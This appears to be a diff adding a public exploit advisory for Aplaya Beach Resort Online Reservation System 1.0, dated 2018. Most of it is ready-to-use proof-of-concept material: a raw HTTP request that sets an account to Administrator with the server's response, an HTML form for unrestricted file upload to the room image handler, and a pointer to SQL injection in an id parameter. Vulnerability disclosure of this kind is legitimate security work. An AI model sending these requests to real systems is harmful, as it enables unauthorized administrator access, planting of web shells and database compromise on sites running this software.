@@ -1,0 +1,56 @@
+# Exploit Title: Aplaya Beach Resort Online Reservation System 1.0 - Multiple Vulnerabilities
+# Dork: N/A
+# Date: 2018-10-29
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://www.sourcecodester.com/users/janobe
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/janobe/aplaya.zip
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/admin/mod_users/controller.php?action=edit
+# 
+POST /[PATH]/admin/mod_users/controller.php?action=edit HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 114
+account_id=5&name=Janno%2BPalacios&deptid=&username=efe%40omerefe.com&deptid=&pass=efe&type=Administrator&save=
+HTTP/1.1 200 OK
+Date: Mon, 29 Oct 2018 08:20:21 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Set-Cookie: PHPSESSID=7v7av68r870gj66ouhf1sk3260; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 57
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/admin/mod_room/controller.php?action=editimage
+# 
+<html>
+<body>
+<form action="http://localhost/[PATH]/admin/mod_room/controller.php?action=editimage" enctype="multipart/form-data" method="POST">
+<input id="image" name="image" type="file"></td>
+<button name="save" type="submit">Save</button>
+</form>
+</body>
+</html>
+
+# POC: 
+# 3)
+# http://localhost/[PATH]/admin/mod_room/index.php?view=view&id=[SQL]
+# 
+#....
